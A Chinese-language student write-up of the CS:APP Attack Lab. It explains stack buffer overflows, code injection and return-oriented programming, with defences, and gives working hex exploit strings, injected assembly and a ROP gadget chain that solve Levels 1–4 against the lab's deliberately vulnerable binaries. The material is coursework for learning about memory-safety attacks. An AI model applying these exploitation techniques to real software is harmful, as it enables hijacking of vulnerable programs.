# Attack Lab: Understanding Buffer Overﬂow Bugs 

## 1. 实验介绍

本次实验内容包括对两个存在不同安全隐患的程序进行五次攻击。完成本次实验后你将获得以下收获：

* 学会利用缓冲区溢出攻击存在安全隐患的程序
* 学会利用编译器和操作系统提供的特性，编写健壮的代码
* 更加深入地理解x86中栈和参数传递机制、x86指令的格式
* 熟练掌握debug工具，如`gdb`和`objdump`

准备工作：

1. 阅读《深入理解计算机系统》的3.10.2~3.10.5
2. 仔细阅读Attack Lab的[writeup](http://csapp.cs.cmu.edu/3e/attacklab.pdf)

## 2. 背景知识

### 2.1. 缓冲区溢出

由于**C语言中对数组引用不做任何边界检查**，而且局部变量和状态信息(例如保存的寄存器值和返回地址)都存放在栈中，所以**对越界的数组元素的写操作会破坏存储在栈中的状态信息**，可能会产生严重的后果。

例子：

```c
typedef struct 
{ 
    int a[2]; 
    double d; 
} struct_t; 

double fun(int i) 
{ 
    volatile struct_t s; 
    s.d = 3.14; 
    s.a[i] = 1073741824; /* Possibly out of bounds */ 
    return s.d; 
}
```

程序输出(不同机器结果可能不同)：

```
fun(0)  -> 3.1400000000 
fun(1)  -> 3.1400000000 
fun(2)  -> 3.1399998665 
fun(3)  -> 2.0000006104 
fun(4)  -> Segmentation fault 
fun(8)  -> 3.140000000
```

结果分析：

![YN6Du6.png](https://s1.ax1x.com/2020/05/12/YN6Du6.png)

在执行fun函数时栈如上图所示。

1. fun(0)和fun(1)修改的是a[0]和a[1]，此时没有任何问题。

2. fun(2)修改了struct_t s中d的低4个字节，影响了d的值
3. fun(3)修改了d的高4个字节，影响了d的值
4. fun(4)修改了栈中的关键状态，造成segmentation fault
5. fun(8)可能修改了栈中非关键信息，没有造成什么大的影响。

Unix中gets函数实现如下：

```c
/* Get string from stdin */ 
char *gets(char *dest) 
{ 
    int c = getchar(); 
    char *p = dest; 
    while (c != EOF && c != '\n') 
    { 
        *p++ = c;
        c = getchar(); 
    } 
    *p = '\0'; 
    return dest; 
}
```

while循环不断地从stdin中读入新的字符放入dest指向的缓冲区中，可是随着用户的不断输入，缓冲区的大小可能不够，造成缓冲区溢出。

### 2.2. 栈溢出攻击

Stack Smashing Attack(栈溢出攻击)是一种常见的通过计算机网络攻击系统安全的方法。通常，输入给程序一个字符串，这个字符串包含一些可执行代码的字节编码，称为攻击代码(exploit code)，另外，还有一些字节会用一个指向攻击代码的指针覆盖返回地址，那么执行ret指令的效果就是跳转到攻击代码。

例子：

```c
//echo.c

#include <stdio.h>
#include <stdlib.h>

/* target code */
void smash(){
    printf("I've been smashed!\n");
    exit(0);
}

/* Implementation of library function gets() */
char *gets(char *s){
    int c;
    char *dest = s;
    while((c = getchar()) != '\n' && c != EOF)
        *dest++ = c;
    if(c == EOF && dest == s)
        /* No characters read */
        return NULL;
    *dest++ = '\0'; /* Terminate string */
    return s;
}

/** Read input line and write it back */
void echo(){
    char buf[4];
    gets(buf);
    puts(buf);
}

int main(int argc, char* argv[]){
    echo();
    return 0;
}
```

使用如下命令编译代码

```shell
$ gcc -fno-asynchronous-unwind-tables -fno-stack-protector -O1 echo.c -o echo
```

* `-fno-asynchronous-unwind-tables` :不生成CFI指令
* `-fno-stack-protector` :阻止进行栈破坏检测，默认是允许使用栈保护者
* `-O1`:不做任何优化处理

使用`objdump`反汇编得到如下结果：

```assembly
000000000000073a <smash>:
 73a:	48 83 ec 08          	sub    $0x8,%rsp
 73e:	48 8d 3d 1f 01 00 00 	lea    0x11f(%rip),%rdi        # 864 <_IO_stdin_used+0x4>
 745:	e8 a6 fe ff ff       	callq  5f0 <puts@plt>
 74a:	bf 00 00 00 00       	mov    $0x0,%edi
 74f:	e8 bc fe ff ff       	callq  610 <exit@plt>

000000000000079d <echo>:
 79d:	53                   	push   %rbx
 79e:	48 83 ec 10          	sub    $0x10,%rsp
 7a2:	48 8d 5c 24 0c       	lea    0xc(%rsp),%rbx
 7a7:	48 89 df             	mov    %rbx,%rdi
 7aa:	e8 a5 ff ff ff       	callq  754 <gets>
 7af:	48 89 df             	mov    %rbx,%rdi
 7b2:	e8 39 fe ff ff       	callq  5f0 <puts@plt>
 7b7:	48 83 c4 10          	add    $0x10,%rsp
 7bb:	5b                   	pop    %rbx
 7bc:	c3                   	retq 
 
 00000000000007bd <main>:
 7bd:	48 83 ec 08          	sub    $0x8,%rsp
 7c1:	b8 00 00 00 00       	mov    $0x0,%eax
 7c6:	e8 d2 ff ff ff       	callq  79d <echo>
 7cb:	b8 00 00 00 00       	mov    $0x0,%eax
 7d0:	48 83 c4 08          	add    $0x8,%rsp
 7d4:	c3                   	retq   
 7d5:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 7dc:	00 00 00 
 7df:	90                   	nop
```

函数执行到echo时栈如下图所示

![YUyMb8.png](https://s1.ax1x.com/2020/05/13/YUyMb8.png)

为了实现echo结束后跳转到smash，输入攻击字符串，将返回地址改为smash函数的首地址，这样当echo执行最后一条指令ret时，将返回到smash执行。

![YUy62R.png](https://s1.ax1x.com/2020/05/13/YUy62R.png)

### 2.3. 代码注入攻击

Code Injection Attacks(代码注入攻击)是指输入的字符串中包含exploit code的字节表示，将返回地址改成exploit code的首地址，这样在ret时将会跳转到exploit code处执行。

![YU6EZT.png](https://s1.ax1x.com/2020/05/13/YU6EZT.png)

### 2.4. 防止栈溢出攻击方法

1. 避免使用gets等存在安全隐患的库函数

2. 操作系统层面：栈随机偏移。在每次程序执行之初，在栈上申请一段随机大小的空间使整个栈移动一段距离，这样可以防止黑客预测exploit code开始的地址

3. 操作系统层面：将栈设置为不可执行(Nonexecutable)，这样执行exploit code时会报错

4.  金丝雀(canary)机制。在buffer之外放置一个特殊的保护值(canary)，在函数执行完返回之前检查保护值是否被更改，如果被更改则检测到stack smashing。

   ![YU6zm6.png](https://s1.ax1x.com/2020/05/13/YU6zm6.png)

## 3. Part1:代码注入攻击

### 3.1. Level 1

```c
void test() 
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}

void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

对于第一阶段，我们并不需要进行代码注入，我们需要做的是劫持程序流，更改函数的返回地址，将函数重定向到我们指定的特定函数。在这个阶段中，我们的任务是在`test`函数执行完`getbuf`后返回到`touch1`函数。

解题思路：

* 找到`getbuf`函数在栈上为输入字符串分配的缓冲区大小
* 找到`touch1`函数的首地址
* 构造exploit code，将缓冲区填满，并在随后的8个字节(返回地址)上填写`touch1`函数的首地址

(1).查看缓冲区大小

利用`gdb`调试`ctarget`，反汇编`getbuf`，根据第一行`sub $0x28, %rsp`可知，在栈上分配的缓冲区大小为40字节。

```assembly
$ gdb ctarget
(gdb) disas getbuf

Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq   
End of assembler dump.
```

(2).找`touch1`首地址

根据第一行可知，`touch1`的首地址为`0x00000000004017c0`。

```assembly
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
End of assembler dump.
```

(3).构造exploit code

首先需要用40字节数据填充缓冲区，然后用touch1首地址填写剩下8字节，构造的exploit code如下。

```
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39
c0 17 40 00 00 00 00 00
```

注意字节顺序，栈上的字节顺序为右低左高，下低上高。

![Yd3X9S.png](https://s1.ax1x.com/2020/05/13/Yd3X9S.png)



### 3.2. Level 2

```c
void touch2(unsigned val)
{
	vlevel = 2; /* Part of validation protocol */
	if (val == cookie) 
	{
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	}
    else 
    {
    	printf("Misfire: You called touch2(0x%.8x)\n", val);
    	fail(2);
    } 
    exit(0);
}
```

第二阶段的任务是在`test`函数执行完`getbuf`后去执行`touch2`，注意`touch2`有一个参数，我们需要在执行`touch2`之前把参数`val`设置为`cookie`，`cookie`的值在cookie.txt中。

解题思路：

![YdwJv6.png](https://s1.ax1x.com/2020/05/13/YdwJv6.png)

使用代码注入攻击，输入的字符串中包含攻击指令，然后将返回地址改成攻击指令的地址。

* 在输入字符串中包含exploit code
* 将返回地址设置为exploit code开始的地址
* 在exploit code中完成参数设置，将`touch2`的首地址压栈，通过`ret`指令跳到`touch2`执行

(1).编写攻击指令

```assembly
push $0x4017ec  ;address of touch2
movq $0x59b997fa, %rdi ;cookie
retq
```

(2).生成攻击指令的字节表示

```
$ gcc -c level2.s
$ objdump -d level2.o > level2.d

Disassembly of section .text:

0000000000000000 <.text>:
   0:   68 ec 17 40 00          pushq  $0x4017ec
   5:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   c:   c3                      retq 
```

(3).确定exploit code放置地址

这里我把exploit code放在缓冲区开始的位置，使用gdb调试ctarget，执行到getbuf中第二条指令，此时`%rsp`为`0x5561dc78`。

```
$ gdb ctarget
(gdb) b getbuf
(gdb) r -q
(gdb) stepi
```

(4).构造输入字符串

```
68 ec 17 40 00 48 c7 c7 fa 97 b9 59 c3    //exploit code
30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 //pad
78 dc 61 55 00 00 00 00 //return address
```

### 3.3 Level 3

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];/* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) 
    {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } 
    else 
    {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

第三阶段也是进行代码注入攻击，让`ctarget`执行`touch3`，所不同的是传递给`touch3`的参数是一个字符串。

由于`touch3`会调用`hexmatch`，而在`hexmatch`申请了一个cbuf，在`strncmp`中会随机使用这部分buffer的某一部分，所以如果我们将字符串放置在`getbuf`的缓冲区中，后续在执行`hexmatch`时，`getbuf`的这部分缓冲区属于`hexmatch`的缓冲区范围之内，字符串可能会被覆盖掉。

```c
char cbuf[110];/* Make position of check string unpredictable */
char *s = cbuf + random() % 100;
```

我想到了三种解决方法：

1. 将字符串放在`test`栈帧中返回地址之上的位置，这样`hexmatch`的栈帧和`test`互相独立，因此不会覆盖掉字符串。
2. 将字符串放置在`hexmatch`的栈帧之外。
3. 在exploit code中将`%rsp`向下减，保证字符串位于`%rsp`之上。

解题思路：

* 将`cookie`字符串转化为16进制
* 将字符串地址传送到`%rdi`中
* 将`touch3`函数地址压栈，调用`ret`指令

(1).编写注入代码

```assembly
movq $0x5561dca8, %rdi
pushq 0x4018fa
ret
```

(2).将注入代码转换为字节表示

```
Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   7:   ff 34 25 fa 18 40 00    pushq  0x4018fa
   e:   c3                      retq
```

(3).将`cookie`转化为16进制

```
35 39 62 39 39 37 66 61 00
```

(4).构造输入字符串

![YdTSWq.png](https://s1.ax1x.com/2020/05/13/YdTSWq.png)

```
48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3  //inject code
30 31 32 33 34 35 36 37 38 39  //pad
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36
78 dc 61 55 00 00 00 00 	// return address 
35 39 62 39 39 37 66 61 00 	// cookie
```

## 4. ROP攻击

与`ctarget`相比，`rtarget`使用了两种技术来防止被攻击

* 栈随机化
* 将栈所在内存标记为不可执行 

为此人们提出了return-oriented-programming(ROP)攻击方法。此方法的核心思想是：不再进行代码注入，而是在已有代码中寻找那些以`ret`结尾的，对我们有用的代码(gadget)。将这些代码的地址以字符串的形式存放在缓冲区中，当程序执行ret指令时会造成一连串的gadget被执行。

以下图为例，当程序执行`ret`指令时，从栈中将gadget1的地址弹出，放到`rip`中，程序转而去执行gadget1的代码，然后执行`ret`，从栈中将gadget2的地址弹出，放到`rip`中，程序转去gadget2执行...

![YdO9p9.png](https://s1.ax1x.com/2020/05/13/YdO9p9.png)

### 4.1. Level4

在这一阶段中，我们其实是重复代码注入攻击中第二阶段的任务，劫持程序流，返回到`touch2`函数。只不过这次我们要做的是ROP攻击，这一阶段我们无法再像上一阶段中将指令序列放入到栈中，所以我们需要到现有的程序中，找到我们需要的指令序列。

解题思路：

![YdvWcj.png](https://s1.ax1x.com/2020/05/13/YdvWcj.png)

(1).在`start_farm`和`middle_farm`之间寻找gadget

`popq %rax`的字节表示为`58`，`movq %rax,%rdi`的字节表示为`48 89 c7`

```assembly
  00000000004019a0 <addval_273>:
  4019a0:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:       c3                      retq
 
  00000000004019a7 <addval_219>:
  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:       c3                      retq
```

从中我们可以得出`popq %rax`指令的地址为：`0x4019ab`，`movq %rax, %rdi`指令的地址为：`0x4019a2`

(2).构造字符串

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

### 4.2. Level 5

>That may not seem signiﬁcantly more difﬁcult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase5 counts for only 5 points, which is not a true measure of the effort it will require. 

被劝退了/(ㄒoㄒ)/~~